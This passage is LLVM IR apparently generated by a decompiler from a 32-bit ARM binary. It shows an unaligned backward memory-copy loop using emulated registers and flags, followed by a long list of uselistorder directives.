  store i32 %v6_154b4, i32* %r4.global-to-local, align 4
  %v7_154b4 = add i32 %v0_154b4, -12
  %v8_154b4 = inttoptr i32 %v7_154b4 to i32*
  %v9_154b4 = load i32, i32* %v8_154b4, align 4
  store i32 %v9_154b4, i32* %r5.global-to-local, align 4
  %v10_154b4 = add i32 %v0_154b4, -16
  %v11_154b4 = inttoptr i32 %v10_154b4 to i32*
  %v12_154b4 = load i32, i32* %v11_154b4, align 4
  store i32 %v10_154b4, i32* %r1.global-to-local, align 4
  %v4_154b8 = udiv i32 %v12_154b4, 65536
  %v5_154b8 = or i32 %v4_154b8, %v3_154b0
  store i32 %v5_154b8, i32* %lr.global-to-local, align 4
  %v3_154bc = mul i32 %v12_154b4, 65536
  %v4_154c0 = udiv i32 %v9_154b4, 65536
  %v5_154c0 = or i32 %v3_154bc, %v4_154c0
  store i32 %v5_154c0, i32* @ip, align 4
  %v3_154c4 = mul i32 %v9_154b4, 65536
  %v4_154c8 = udiv i32 %v6_154b4, 65536
  %v5_154c8 = or i32 %v3_154c4, %v4_154c8
  store i32 %v5_154c8, i32* %r5.global-to-local, align 4
  %v3_154cc = mul i32 %v6_154b4, 65536
  %v4_154d0 = udiv i32 %v3_154b4, 65536
  %v5_154d0 = or i32 %v3_154cc, %v4_154d0
  store i32 %v5_154d0, i32* %r4.global-to-local, align 4
  %v1_154d4 = add i32 %v0_154d4, -16
  %v2_154d4 = inttoptr i32 %v1_154d4 to i32*
  store i32 %v5_154d0, i32* %v2_154d4, align 4
  %v4_154d4 = add i32 %v0_154d4, -12
  %v5_154d4 = inttoptr i32 %v4_154d4 to i32*
  %v6_154d4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_154d4, i32* %v5_154d4, align 4
  %v7_154d4 = add i32 %v0_154d4, -8
  %v8_154d4 = inttoptr i32 %v7_154d4 to i32*
  %v9_154d4 = load i32, i32* @ip, align 4
  store i32 %v9_154d4, i32* %v8_154d4, align 4
  %v10_154d4 = add i32 %v0_154d4, -4
  %v11_154d4 = inttoptr i32 %v10_154d4 to i32*
  %v12_154d4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_154d4, i32* %v11_154d4, align 4
  store i32 %v1_154d4, i32* %r0.global-to-local, align 4
  %v0_154d8 = load i32, i32* %r2.global-to-local, align 4
  %v2_154d8 = add i32 %v0_154d8, -16
  store i32 %v2_154d8, i32* %r2.global-to-local, align 4
  %v6_154dc = icmp slt i32 %v0_154d8, 16
  br i1 %v6_154dc, label %dec_label_pc_154e0, label %dec_label_pc_154b0.dec_label_pc_154b0_crit_edge

dec_label_pc_154b0.dec_label_pc_154b0_crit_edge:  ; preds = %dec_label_pc_154b0
  %v0_154b0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_154b4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_154b0

dec_label_pc_154e0:                               ; preds = %dec_label_pc_154b0
  %v2_154e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_154e0, i32* @r4, align 4
  %v5_154e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_154e0, i32* @r5, align 4
  store i32 %v9_154ac, i32* @lr, align 4
  %v2_154e4 = add i32 %v0_154d8, -4
  store i32 %v2_154e4, i32* %r2.global-to-local, align 4
  %v4_154e4 = add i32 %v0_154d8, 2147483632
  %v5_154e4 = and i32 %v2_154e4, %v4_154e4
  %v6_154e4 = icmp slt i32 %v5_154e4, 0
  store i1 %v6_154e4, i1* %cpsr_v.global-to-local, align 1
  %v7_154e4 = icmp slt i32 %v2_154e4, 0
  store i1 %v7_154e4, i1* %cpsr_n.global-to-local, align 1
  %v8_154e4 = icmp eq i32 %v2_154e4, 0
  store i1 %v8_154e4, i1* %cpsr_z.global-to-local, align 1
  %v5_154e8 = icmp slt i32 %v2_154d8, -12
  br i1 %v5_154e8, label %dec_label_pc_15504, label %dec_label_pc_154ec

dec_label_pc_154ec:                               ; preds = %dec_label_pc_154e0, %dec_label_pc_154a0, %dec_label_pc_154ec
  %v1_154f8 = phi i32 [ %v5_154f8, %dec_label_pc_154ec ], [ %v1_154d4, %dec_label_pc_154e0 ], [ %v0_1546830, %dec_label_pc_154a0 ]
  %v0_154ec = load i32, i32* %r3.global-to-local, align 4
  %v3_154ec = mul i32 %v0_154ec, 65536
  store i32 %v3_154ec, i32* %ip.global-to-local, align 4
  %v0_154f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_154f0 = add i32 %v0_154f0, -4
  %v2_154f0 = inttoptr i32 %v1_154f0 to i32*
  %v3_154f0 = load i32, i32* %v2_154f0, align 4
  store i32 %v3_154f0, i32* %r3.global-to-local, align 4
  store i32 %v1_154f0, i32* %r1.global-to-local, align 4
  %v4_154f4 = udiv i32 %v3_154f0, 65536
  %v5_154f4 = or i32 %v4_154f4, %v3_154ec
  store i32 %v5_154f4, i32* @ip, align 4
  %v2_154f8 = add i32 %v1_154f8, -4
  %v3_154f8 = inttoptr i32 %v2_154f8 to i32*
  store i32 %v5_154f4, i32* %v3_154f8, align 4
  %v4_154f8 = load i32, i32* %r0.global-to-local, align 4
  %v5_154f8 = add i32 %v4_154f8, -4
  store i32 %v5_154f8, i32* %r0.global-to-local, align 4
  %v0_154fc = load i32, i32* %r2.global-to-local, align 4
  %v2_154fc = add i32 %v0_154fc, -4
  store i32 %v2_154fc, i32* %r2.global-to-local, align 4
  %v6_15500 = icmp slt i32 %v0_154fc, 4
  br i1 %v6_15500, label %dec_label_pc_15504.loopexit, label %dec_label_pc_154ec

dec_label_pc_15504.loopexit:                      ; preds = %dec_label_pc_154ec
  %v4_154fc = sub i32 3, %v0_154fc
  %v5_154fc = and i32 %v4_154fc, %v0_154fc
  %v6_154fc = icmp slt i32 %v5_154fc, 0
  %v7_154fc = icmp slt i32 %v2_154fc, 0
  store i1 %v6_154fc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_154fc, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15504

dec_label_pc_15504:                               ; preds = %dec_label_pc_15504.loopexit, %dec_label_pc_154e0
  %v2_153dc63 = phi i32 [ %v5_154f8, %dec_label_pc_15504.loopexit ], [ %v1_154d4, %dec_label_pc_154e0 ]
  %v0_153cc59 = phi i32 [ %v2_154fc, %dec_label_pc_15504.loopexit ], [ %v2_154e4, %dec_label_pc_154e0 ]
  %v0_15504 = load i32, i32* %r1.global-to-local, align 4
  %v1_15504 = add i32 %v0_15504, 2
  store i32 %v1_15504, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_1550c:                               ; preds = %dec_label_pc_15420
  br i1 %v5_15510, label %dec_label_pc_15558, label %dec_label_pc_15514

dec_label_pc_15514:                               ; preds = %dec_label_pc_1550c
  store i32 %v2_1550c, i32* %r2.global-to-local, align 4
  %v3_15518 = load i32, i32* @r4, align 4
  store i32 %v3_15518, i32* %stack_var_-12, align 4
  %v6_15518 = load i32, i32* @r5, align 4
  store i32 %v6_15518, i32* %stack_var_-8, align 4
  %v9_15518 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1551c

dec_label_pc_1551c:                               ; preds = %dec_label_pc_1551c.dec_label_pc_1551c_crit_edge, %dec_label_pc_15514
  %v0_15540 = phi i32 [ %v1_15540, %dec_label_pc_1551c.dec_label_pc_1551c_crit_edge ], [ %v0_1546830, %dec_label_pc_15514 ]
  %v0_15520 = phi i32 [ %v0_15520.pre, %dec_label_pc_1551c.dec_label_pc_1551c_crit_edge ], [ %v1_15420, %dec_label_pc_15514 ]
  %v0_1551c = phi i32 [ %v0_1551c.pre, %dec_label_pc_1551c.dec_label_pc_1551c_crit_edge ], [ %v2_15424, %dec_label_pc_15514 ]
  %v3_1551c = mul i32 %v0_1551c, 16777216
  store i32 %v3_1551c, i32* %lr.global-to-local, align 4
  %v1_15520 = add i32 %v0_15520, -4
  %v2_15520 = inttoptr i32 %v1_15520 to i32*
  %v3_15520 = load i32, i32* %v2_15520, align 4
  store i32 %v3_15520, i32* %r3.global-to-local, align 4
  %v4_15520 = add i32 %v0_15520, -8
  %v5_15520 = inttoptr i32 %v4_15520 to i32*
  %v6_15520 = load i32, i32* %v5_15520, align 4
  store i32 %v6_15520, i32* %r4.global-to-local, align 4
  %v7_15520 = add i32 %v0_15520, -12
  %v8_15520 = inttoptr i32 %v7_15520 to i32*
  %v9_15520 = load i32, i32* %v8_15520, align 4
  store i32 %v9_15520, i32* %r5.global-to-local, align 4
  %v10_15520 = add i32 %v0_15520, -16
  %v11_15520 = inttoptr i32 %v10_15520 to i32*
  %v12_15520 = load i32, i32* %v11_15520, align 4
  store i32 %v10_15520, i32* %r1.global-to-local, align 4
  %v4_15524 = udiv i32 %v12_15520, 256
  %v5_15524 = or i32 %v4_15524, %v3_1551c
  store i32 %v5_15524, i32* %lr.global-to-local, align 4
  %v3_15528 = mul i32 %v12_15520, 16777216
  %v4_1552c = udiv i32 %v9_15520, 256
  %v5_1552c = or i32 %v3_15528, %v4_1552c
  store i32 %v5_1552c, i32* @ip, align 4
  %v3_15530 = mul i32 %v9_15520, 16777216
  %v4_15534 = udiv i32 %v6_15520, 256
  %v5_15534 = or i32 %v3_15530, %v4_15534
  store i32 %v5_15534, i32* %r5.global-to-local, align 4
  %v3_15538 = mul i32 %v6_15520, 16777216
  %v4_1553c = udiv i32 %v3_15520, 256
  %v5_1553c = or i32 %v3_15538, %v4_1553c
  store i32 %v5_1553c, i32* %r4.global-to-local, align 4
  %v1_15540 = add i32 %v0_15540, -16
  %v2_15540 = inttoptr i32 %v1_15540 to i32*
  store i32 %v5_1553c, i32* %v2_15540, align 4
  %v4_15540 = add i32 %v0_15540, -12
  %v5_15540 = inttoptr i32 %v4_15540 to i32*
  %v6_15540 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15540, i32* %v5_15540, align 4
  %v7_15540 = add i32 %v0_15540, -8
  %v8_15540 = inttoptr i32 %v7_15540 to i32*
  %v9_15540 = load i32, i32* @ip, align 4
  store i32 %v9_15540, i32* %v8_15540, align 4
  %v10_15540 = add i32 %v0_15540, -4
  %v11_15540 = inttoptr i32 %v10_15540 to i32*
  %v12_15540 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15540, i32* %v11_15540, align 4
  store i32 %v1_15540, i32* %r0.global-to-local, align 4
  %v0_15544 = load i32, i32* %r2.global-to-local, align 4
  %v2_15544 = add i32 %v0_15544, -16
  store i32 %v2_15544, i32* %r2.global-to-local, align 4
  %v6_15548 = icmp slt i32 %v0_15544, 16
  br i1 %v6_15548, label %dec_label_pc_1554c, label %dec_label_pc_1551c.dec_label_pc_1551c_crit_edge

dec_label_pc_1551c.dec_label_pc_1551c_crit_edge:  ; preds = %dec_label_pc_1551c
  %v0_1551c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15520.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1551c

dec_label_pc_1554c:                               ; preds = %dec_label_pc_1551c
  %v2_1554c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1554c, i32* @r4, align 4
  %v5_1554c = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_1554c, i32* @r5, align 4
  store i32 %v9_15518, i32* @lr, align 4
  %v2_15550 = add i32 %v0_15544, -4
  store i32 %v2_15550, i32* %r2.global-to-local, align 4
  %v4_15550 = add i32 %v0_15544, 2147483632
  %v5_15550 = and i32 %v2_15550, %v4_15550
  %v6_15550 = icmp slt i32 %v5_15550, 0
  store i1 %v6_15550, i1* %cpsr_v.global-to-local, align 1
  %v7_15550 = icmp slt i32 %v2_15550, 0
  store i1 %v7_15550, i1* %cpsr_n.global-to-local, align 1
  %v8_15550 = icmp eq i32 %v2_15550, 0
  store i1 %v8_15550, i1* %cpsr_z.global-to-local, align 1
  %v5_15554 = icmp slt i32 %v2_15544, -12
  br i1 %v5_15554, label %dec_label_pc_15570, label %dec_label_pc_15558

dec_label_pc_15558:                               ; preds = %dec_label_pc_1554c, %dec_label_pc_1550c, %dec_label_pc_15558
  %v1_15564 = phi i32 [ %v5_15564, %dec_label_pc_15558 ], [ %v1_15540, %dec_label_pc_1554c ], [ %v0_1546830, %dec_label_pc_1550c ]
  %v0_15558 = load i32, i32* %r3.global-to-local, align 4
  %v3_15558 = mul i32 %v0_15558, 16777216
  store i32 %v3_15558, i32* %ip.global-to-local, align 4
  %v0_1555c = load i32, i32* %r1.global-to-local, align 4
  %v1_1555c = add i32 %v0_1555c, -4
  %v2_1555c = inttoptr i32 %v1_1555c to i32*
  %v3_1555c = load i32, i32* %v2_1555c, align 4
  store i32 %v3_1555c, i32* %r3.global-to-local, align 4
  store i32 %v1_1555c, i32* %r1.global-to-local, align 4
  %v4_15560 = udiv i32 %v3_1555c, 256
  %v5_15560 = or i32 %v4_15560, %v3_15558
  store i32 %v5_15560, i32* @ip, align 4
  %v2_15564 = add i32 %v1_15564, -4
  %v3_15564 = inttoptr i32 %v2_15564 to i32*
  store i32 %v5_15560, i32* %v3_15564, align 4
  %v4_15564 = load i32, i32* %r0.global-to-local, align 4
  %v5_15564 = add i32 %v4_15564, -4
  store i32 %v5_15564, i32* %r0.global-to-local, align 4
  %v0_15568 = load i32, i32* %r2.global-to-local, align 4
  %v2_15568 = add i32 %v0_15568, -4
  store i32 %v2_15568, i32* %r2.global-to-local, align 4
  %v6_1556c = icmp slt i32 %v0_15568, 4
  br i1 %v6_1556c, label %dec_label_pc_15570.loopexit, label %dec_label_pc_15558

dec_label_pc_15570.loopexit:                      ; preds = %dec_label_pc_15558
  %v4_15568 = sub i32 3, %v0_15568
  %v5_15568 = and i32 %v4_15568, %v0_15568
  %v6_15568 = icmp slt i32 %v5_15568, 0
  %v7_15568 = icmp slt i32 %v2_15568, 0
  store i1 %v6_15568, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15568, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15570

dec_label_pc_15570:                               ; preds = %dec_label_pc_15570.loopexit, %dec_label_pc_1554c
  %v2_153dc64 = phi i32 [ %v5_15564, %dec_label_pc_15570.loopexit ], [ %v1_15540, %dec_label_pc_1554c ]
  %v0_153cc60 = phi i32 [ %v2_15568, %dec_label_pc_15570.loopexit ], [ %v2_15550, %dec_label_pc_1554c ]
  %v0_15570 = load i32, i32* %r1.global-to-local, align 4
  %v1_15570 = add i32 %v0_15570, 1
  store i32 %v1_15570, i32* %r1.global-to-local, align 4
  br label %bb141

; uselistorder directives
  uselistorder i32 %v5_15564, { 0, 2, 1 }
  uselistorder i32 %v3_15558, { 1, 0 }
  uselistorder i32 %v2_15550, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15540, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15520, { 1, 0 }
  uselistorder i32 %v3_1551c, { 1, 0 }
  uselistorder i32 %v0_15520, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15540, { 3, 2, 1, 0 }
  uselistorder i32 %v5_154f8, { 0, 2, 1 }
  uselistorder i32 %v3_154ec, { 1, 0 }
  uselistorder i32 %v2_154e4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_154d4, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_154b4, { 1, 0 }
  uselistorder i32 %v3_154b0, { 1, 0 }
  uselistorder i32 %v0_154b4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_154d4, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1548c, { 0, 2, 1 }
  uselistorder i32 %v3_15480, { 1, 0 }
  uselistorder i32 %v2_15478, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15468, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15448, { 1, 0 }
  uselistorder i32 %v3_15444, { 1, 0 }
  uselistorder i32 %v0_15448, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15468, { 3, 2, 1, 0 }
  uselistorder i1 %v5_15510, { 2, 0, 1 }
  uselistorder i32 %v0_15428, { 1, 0 }
  uselistorder i32 %v0_15514, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1546830, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_15418, { 2, 1, 0 }
  uselistorder i32 %v0_15418, { 2, 0, 1 }
  uselistorder i32 %v2_15410, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_15410, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15410, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1546831, { 2, 1, 0 }
  uselistorder i32 %v11_153ec, { 1, 0 }
  uselistorder i32 %v7_153ec, { 1, 0 }
  uselistorder i32 %v1_153cc, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_153cc, { 1, 2, 0, 3 }
  uselistorder i32 %v2_153d0, { 1, 0 }
  uselistorder i32 %v7_153c4, { 0, 2, 1 }
  uselistorder i32 %v10_153c0, { 1, 0 }
  uselistorder i32 %v9_153b8, { 1, 0, 2 }
  uselistorder i32 %v6_153b4, { 1, 0 }
  uselistorder i32 %v2_153ac, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_153ac, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_153bc, { 0, 3, 2, 1 }
  uselistorder i32 %v7_153a0, { 0, 2, 1 }
  uselistorder i32 %v13_1539c, { 1, 0 }
  uselistorder i32 %v4_15398, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_15398, { 2, 0, 1 }
  uselistorder i32 %v6_153a0, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15390, { 0, 2, 1 }
  uselistorder i32 %v16_1538c, { 1, 0 }
  uselistorder i32 %v4_15388, { 1, 2, 0 }
  uselistorder i32 %v0_15398.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_15390, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1537c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_15378, { 1, 0 }
  uselistorder i32 %v1_15374, { 1, 0 }
  uselistorder i32 %v10_15370, { 1, 0 }
  uselistorder i32 %v0_15370, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15374, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_15368, { 0, 2, 1 }
  uselistorder i32 %v2_1535c, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_1535c, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1537448, { 1, 2, 0 }
  uselistorder i32 %v1_15354, { 2, 1, 0 }
  uselistorder i32 %v1_1534c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_15344, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_15340, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_1533c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_1533c, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v4_15328, { 0, 2, 1 }
  uselistorder i32 %v3_1531c, { 1, 0 }
  uselistorder i32 %v2_15314, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v12_15304, { 1, 0, 3, 2 }
  uselistorder i32 %v8_152e4, { 1, 0, 2 }
  uselistorder i32 %v5_152e4, { 1, 0, 2 }
  uselistorder i32 %v2_152e4, { 1, 0, 2 }
  uselistorder i32 %v3_152e0, { 1, 0 }
  uselistorder i32 %v0_152e4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15304, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_152bc, { 0, 2, 1 }
  uselistorder i32 %v3_152b0, { 1, 0 }
  uselistorder i32 %v2_152a8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v12_15298, { 1, 0, 3, 2 }
  uselistorder i32 %v8_15278, { 1, 0, 2 }
  uselistorder i32 %v5_15278, { 1, 0, 2 }
  uselistorder i32 %v2_15278, { 1, 0, 2 }
  uselistorder i32 %v3_15274, { 1, 0 }
  uselistorder i32 %v0_15278, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15298, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_15250, { 0, 2, 1 }
  uselistorder i32 %v3_15244, { 1, 0 }
  uselistorder i32 %v2_1523c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v12_1522c, { 1, 0, 3, 2 }
  uselistorder i32 %v8_1520c, { 1, 0, 2 }
  uselistorder i32 %v5_1520c, { 1, 0, 2 }
  uselistorder i32 %v2_1520c, { 1, 0, 2 }
  uselistorder i32 %v3_15208, { 1, 0 }
  uselistorder i32 %v0_1520c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1522c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_152d4, { 2, 0, 1 }
  uselistorder i32 %v0_152d8, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1522c74, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_151dc, { 1, 0 }
  uselistorder i32 %v0_151dc, { 3, 1, 0, 2 }
  uselistorder i32 %v2_151d4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_151d4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_151d4, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1522c75, { 2, 1, 0 }
  uselistorder i32 %v1_151b4, { 1, 0, 2 }
  uselistorder i32 %v1_1518c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1518c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_15178, { 1, 0, 2 }
  uselistorder i32 %v6_15174, { 1, 0 }
  uselistorder i32 %v2_1516c, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_1516c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1517c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_15164, { 0, 2, 1 }
  uselistorder i32 %v3_15164, { 3, 0, 1, 2 }
  uselistorder i1 %v0_15164, { 1, 0 }
  uselistorder i1 %v1_15164, { 1, 0 }
  uselistorder i32 %v3_15160, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15158, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v4_15144, { 1, 2, 0 }
  uselistorder i32 %v12_15138, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1512c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15130, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_15120, { 0, 2, 1 }
  uselistorder i32 %v2_15118, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_15118, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v1_15110, { 1, 0 }
  uselistorder i32 %v1_15108, { 2, 1, 0 }
  uselistorder i32 %v2_15100, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_15100, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v2_150f0, { 1, 0 }
  uselistorder i32 %v1_150f0, { 1, 5, 6, 3, 4, 0, 7, 9, 2, 8, 10 }
  uselistorder i32 %v0_150f0, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 35, 36, 37, 38, 39, 40, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %r2.global-to-local, { 0, 25, 1, 2, 3, 4, 5, 26, 6, 7, 8, 9, 10, 27, 11, 12, 13, 14, 15, 28, 66, 67, 69, 68, 70, 71, 16, 17, 18, 19, 21, 20, 22, 23, 24, 29, 30, 61, 31, 32, 33, 34, 35, 62, 36, 37, 38, 39, 40, 63, 41, 42, 43, 44, 45, 64, 46, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 65 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 0, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 56, 19, 20, 21, 55, 58, 59, 61, 60, 62, 63, 65, 64, 66, 57, 22, 53, 23, 54, 24, 25, 26, 27, 28, 31, 29, 41, 30, 32, 35, 33, 42, 34, 36, 39, 37, 43, 38, 40, 44, 45, 46, 48, 47, 49, 50, 51, 52 }
  uselistorder i32* %r0.global-to-local, { 0, 23, 1, 2, 24, 3, 4, 25, 5, 6, 7, 8, 26, 28, 13, 29, 31, 30, 32, 33, 35, 34, 36, 27, 9, 10, 11, 12, 14, 15, 16, 18, 17, 19, 20, 21, 22 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 41, 42, 43, 44, 45, 46, 13, 14, 3, 15, 16, 17, 18, 19, 0, 20, 1, 22, 2, 23, 21, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 36, 37, 38, 39, 40, 41, 42, 12, 13, 3, 14, 15, 16, 0, 17, 1, 19, 2, 20, 18, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 42, 44, 43, 45, 46, 47, 48, 13, 14, 3, 15, 16, 17, 18, 19, 0, 20, 1, 22, 2, 23, 21, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 31, { 22, 23, 1, 0, 10, 12, 11, 13, 2, 15, 16, 27, 14, 17, 6, 18, 24, 19, 25, 20, 26, 21, 7, 3, 8, 4, 5, 9 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 -2, { 12, 13, 11, 23, 0, 15, 1, 16, 2, 3, 10, 9, 8, 5, 7, 6, 4, 24, 25, 26, 27, 14, 22, 21, 20, 19, 18, 17 }
  uselistorder i32 65536, { 7, 6, 12, 8, 13, 9, 14, 10, 15, 11, 16, 17, 18, 22, 19, 23, 20, 24, 21, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 55, 54, 56, 57, 58, 59, 1, 60, 0, 2, 61, 62, 63, 64, 65, 68, 66, 67, 69, 70, 71, 75, 76, 77, 78, 72, 73, 74, 79, 82, 83, 84, 80, 81, 85, 86, 87, 89, 88, 90, 3, 91, 93, 94, 92, 95, 96, 98, 99, 100, 97, 101, 102, 103, 104, 105, 107, 106, 109, 108, 110, 112, 111, 114, 113, 115, 4, 116, 118, 119, 120, 117, 121, 5, 122, 126, 127, 128, 123, 124, 125, 130, 129 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 16777216, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 47, 46, 52, 48, 53, 49, 51, 50, 54, 56, 55, 58, 57, 60, 59, 61, 62, 70, 63, 71, 64, 72, 65, 73, 74, 66, 75, 67, 76, 68, 77, 69, 81, 78, 82, 79, 83, 80, 87, 84, 88, 85, 89, 86, 90, 91, 92, 97, 93, 98, 94, 99, 95, 100, 96, 101, 102, 103, 104, 105, 106, 110, 107, 111, 108, 112, 109, 113, 114, 116, 115, 122, 117, 123, 118, 124, 119, 125, 120, 126, 121, 127, 130, 131, 128, 129, 132, 133, 137, 134, 138, 135, 136, 139, 146, 140, 147, 148, 141, 149, 144, 150, 142, 151, 152, 143, 145, 153, 154, 158, 155, 159, 160, 156, 157, 161, 162, 163, 165, 164, 168, 166, 169, 167, 170, 171, 172 }
  uselistorder i32* @r5, {}
  uselistorder i32 -3, { 1, 2, 0, 3, 4, 6, 5 }
  uselistorder i32 -5, { 1, 0 }
  uselistorder i32 11, { 12, 13, 14, 17, 18, 3, 0, 4, 1, 5, 2, 44, 45, 46, 47, 15, 6, 16, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 7, 29, 30, 31, 8, 32, 33, 34, 9, 35, 36, 37, 38, 39, 40, 41, 42, 43, 10, 48, 49, 50, 11, 51 }
  uselistorder i32 -12, { 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 3, 4, 5, 22, 6, 23, 24 }
  uselistorder i32 48, { 0, 9, 10, 7, 8, 2, 15, 3, 1, 11, 4, 12, 5, 13, 6, 14 }
  uselistorder i32 40, { 2, 10, 3, 1, 0, 4, 24, 25, 11, 5, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 7, 26, 8, 27, 6, 28, 9, 29 }
  uselistorder i32 36, { 1, 8, 9, 6, 7, 0, 2, 3, 10, 4, 11, 5, 12 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0 }
  uselistorder i32 -32, { 1, 0, 2, 3 }
